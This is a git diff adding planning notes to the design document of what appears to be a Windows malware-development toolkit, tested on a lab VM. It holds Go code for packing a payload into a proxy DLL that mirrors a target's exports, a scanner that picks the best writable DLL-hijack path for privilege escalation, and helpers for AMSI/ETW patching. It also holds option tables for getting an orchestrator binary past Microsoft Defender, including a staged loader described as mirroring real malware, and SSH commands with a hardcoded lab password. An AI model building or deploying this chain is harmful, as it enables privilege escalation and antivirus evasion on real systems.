@@ -139,6 +139,151 @@ tool doesn't reinvent them.
 | 9.8.b | **Defender flagging the orchestrator binary**: signature on the unpacked Go binary. Solution: stronger runtime evasion (preset.Aggressive instead of Stealth) — adds ACG + BlockDLLs on top of AMSI+ETW+unhook. | Replace `preset.Stealth()` with `preset.Aggressive()` in `cmd/privesc-e2e/amsi_windows.go`. | ⏳ |
 | 9.8.c | **Verdict ADEQUATE -> STRONG**: auto-resolves once 9.8.a fixes the probe race. The probe successfully writes whoami.txt, the driver fetches it, the verdict promotes from ADEQUATE to STRONG. | No code change; validate after 9.8.a. | ⏳ |
 
+### Sub-slice 9.7 — design notes per helper
+
+**9.7.a `packer.PackProxyDLLFromTarget(payload, targetDLLBytes, opts) (proxy, key []byte, err error)`**
+
+Lives next to `PackProxyDLL` in `pe/packer/proxy_fused.go`. Body:
+
+```go
+func PackProxyDLLFromTarget(payload []byte, targetDLLBytes []byte, opts ProxyDLLOptions) (proxy, key []byte, err error) {
+    pf, err := parse.FromBytes(targetDLLBytes, "<embedded-target>")
+    if err != nil {
+        return nil, nil, fmt.Errorf("packer: PackProxyDLLFromTarget parse target: %w", err)
+    }
+    entries, err := pf.ExportEntries()
+    if err != nil {
+        return nil, nil, fmt.Errorf("packer: PackProxyDLLFromTarget exports: %w", err)
+    }
+    var exports []dllproxy.Export
+    for _, e := range entries {
+        if e.Name == "" { continue } // skip ordinal-only
+        exports = append(exports, dllproxy.Export{Name: e.Name, Ordinal: e.Ordinal})
+    }
+    if len(exports) == 0 {
+        return nil, nil, fmt.Errorf("packer: PackProxyDLLFromTarget target has no named exports")
+    }
+    o := opts
+    if o.TargetName == "" {
+        return nil, nil, fmt.Errorf("packer: PackProxyDLLFromTarget TargetName required (cannot infer from binary)")
+    }
+    o.Exports = exports
+    return PackProxyDLL(payload, o)
+}
+```
+
+Tests: `TestPackProxyDLLFromTarget_MirrorsExports` (pack a known fixture, parse the proxy, assert exports match input).
+Doc: extend the comment block on `PackProxyDLL` with a reference to this helper.
+
+**9.7.b `dllhijack.PickBestWritable(opts ScanOpts) (*Opportunity, error)`**
+
+Lives in `recon/dllhijack/dllhijack.go`. Body:
+
+```go
+func PickBestWritable(opts ScanOpts) (*Opportunity, error) {
+    all, err := ScanAll(opts)
+    if err != nil {
+        return nil, fmt.Errorf("dllhijack: PickBestWritable ScanAll: %w", err)
+    }
+    ranked := Rank(all)
+    // Prefer writable + integrity-gain
+    for i := range ranked {
+        if ranked[i].Writable && (ranked[i].IntegrityGain || ranked[i].AutoElevate) {
+            return &ranked[i], nil
+        }
+    }
+    // Fallback: any writable
+    for i := range ranked {
+        if ranked[i].Writable {
+            return &ranked[i], nil
+        }
+    }
+    return nil, fmt.Errorf("dllhijack: PickBestWritable found no writable opportunity (scanned %d total)", len(ranked))
+}
+```
+
+Tests: stub on non-windows, real test on windows VM gates.
+
+**9.7.c (BONUS) `evasion.ApplyAllAggregated(techs []Technique, caller *wsyscall.Caller) error`**
+
+Companion to existing `ApplyAll` which returns `map[string]error`. Aggregates failures into single sortable-message error. Saves the same boilerplate we wrote in `cmd/privesc-e2e/amsi_windows.go`.
+
+Lives in `evasion/evasion.go`. Tests: assert single-error path equals nil when all OK, and contains all failure names when ≥1 fails.
+
+### Sub-slice 9.8 — brainstorm matrix per gap
+
+**Gap 2 (probe race) — six options:**
+
+| ID | Option | Cost | Risk |
+|---|---|---|---|
+| 2A | Victim sleeps 5 s after LoadLibrary | 1 LOC | none — chosen |
+| 2B | Probe writes whoami.txt FIRST then breadcrumbs (single critical write) | 5 LOC | doesn't fix the race, just makes the surviving write the important one |
+| 2C | Probe spawns whoami.exe via CreateProcess with redirected stdout — child outlives victim | 30 LOC C | adds advapi32-style imports to probe |
+| 2D | Probe registers async I/O completion / DPC — survives ExitProcess | high LOC | Windows kernel APIs from user-mode are sketchy |
+| 2E | Probe calls ExitProcess(0) itself after writes — preempts victim's cleanup race | 1 LOC | victim never gets to print its post-LoadLibrary log line; cosmetic |
+| 2F | Mode 8 stub patches: DllMain blocks until spawned thread signals done | medium LOC in packer | deepest fix, benefits everyone using Mode 8 |
+
+Recommended: **2A first (cheapest), keep 2F as a future packer enhancement**.
+
+**Gap 3 (Defender on orchestrator binary) — six options:**
+
+| ID | Option | Cost | Risk |
+|---|---|---|---|
+| 3A | preset.Aggressive (Stealth + ACG + BlockDLLs) | 1 LOC swap | ACG blocks subsequent VirtualAlloc(PAGE_EXECUTE) — must apply AFTER all our pack calls. Order matters. |
+| 3B | Pack the orchestrator itself with `packer.PackBinary{Compress, AntiDebug, RandomizeAll}` (Mode 3) | host build script change | adds a build step; orchestrator becomes a packed EXE |
+| 3C | Strip + UPX + reorder sections | 1 LOC ldflags | weaker than 3A/3B |
+| 3D | Split orchestrator: stage1 (tiny ~10 KB loader) + stage2 (full 12 MB payload). Stage1 applies preset.Aggressive, allocates RX, decrypts + jumps stage2 | 200+ LOC | most operationally realistic; mirrors real maldev shape |
+| 3E | Self-sign + add cert to Trusted Root | requires admin to install cert; fragile per machine | not portable |
+| 3F | Live with no exclusions, document Defender behaviour as expected (operator tier) | 0 LOC | accepts the gap |
+
+Recommended: **3A as a quick win** (move patchAMSI() AFTER all our VirtualAlloc-needing calls — packer is one). If 3A still flagged, **3B**.
+
+**Gap 4 (verdict)** — auto-resolves with 2A.
+
+**Gap 5 (driver bash quoting)** — three options:
+
+| ID | Option | Cost | Risk |
+|---|---|---|---|
+| 5A | Write the full PS invocation as a heredoc-built .ps1 on the host, SCP to VM, invoke as a single argument (already partially done at scripts/vm-privesc-e2e.sh:108-110 but the heredoc still has `\${SSH_USER}` escape bugs we fixed) | 10 LOC bash | Same approach we tried; needs careful verification of heredoc expansion |
+| 5B | Encode the parameters as base64, decode in PS (no quoting hell) | 15 LOC | adds a debug-unfriendly indirection |
+| 5C | Replace the bash driver entirely with a Go program in `cmd/privesc-e2e-driver/` that uses crypto/ssh to SCP+exec. No shell quoting. | 200 LOC | clean but big |
+
+Recommended: **5A first verify carefully** with `cat > tmp/run.ps1 <<EOF` then `cat /tmp/run.ps1` to inspect, then `scp` then SSH `powershell -File`. If still flaky, **5C is the proper fix**.
+
+### Master execution order (post-resume)
+
+```
+1. 9.7.a + 9.7.c (helpers, no VM needed) -> commit, push
+2. 9.7.b (dllhijack helper) -> commit, push
+3. Refactor cmd/privesc-e2e/main.go to use the 3 helpers -> commit, push
+4. 9.8.a (victim sleep 5 s) -> commit, push
+5. 9.8.b (preset.Aggressive, after audit of order-of-ops) -> commit, push
+6. Re-run vm-privesc-e2e.sh -m 8 -- expect STRONG verdict
+7. Run -m 10 -- validate Mode 10 helper path end-to-end
+8. 9.6.f tag v0.132.0
+9. 9.6.g write the user-facing doc against the working chain
+10. (optional) 9.7.b extension: same scan-and-pick pattern for AutoElevate-only flows
+```
+
+### Cross-machine resume — exhaustive context dump
+
+State at handoff:
+- HEAD = 7f25ec2 (this commit will land at HEAD after the planning-doc commit).
+- All 14 lessons captured in `docs/refactor-2026-doc/privesc-e2e-lessons-2026-05-12.md`.
+- `cmd/privesc-e2e/probe/probe.exe` and `cmd/privesc-e2e/fakelib/fakelib.dll` are gitignored;
+  rebuild via the README's host-side commands or just re-run `bash scripts/vm-privesc-e2e.sh`.
+- Win10 VM is at INIT snapshot (clean); driver auto-restores.
+- Manual SSH commands proven working at this point in time:
+  - `ssh -i ~/.ssh/vm_windows_key test@192.168.56.102 'net user lowuser MaldevLow42x'` then
+  - `ssh ... 'powershell -ExecutionPolicy Bypass -File C:\Users\test\run-as-lowuser.ps1 -Binary "C:\Users\Public\maldev\privesc-e2e.exe" -BinaryArgs "-mode 8" -UserName lowuser -Password MaldevLow42x -TimeoutSeconds 180'`
+  - That manual flow produces full orchestrator output AND `LoadLibrary succeeded:
+    handle=0x140000000` in `C:\ProgramData\maldev-marker\victim.log` after the next
+    minute-trigger fires.
+- The probe payload reaches main() (probe-started.txt + probe-root-marker.txt produced)
+  but the third WriteFile (whoami.txt) races victim's ExitProcess. 9.8.a fixes this.
+
+Pickup at 1. above.
+
 ---
 
 **Slice 1.A FULLY HARDENED.** v0.130.0 shipped the feature;
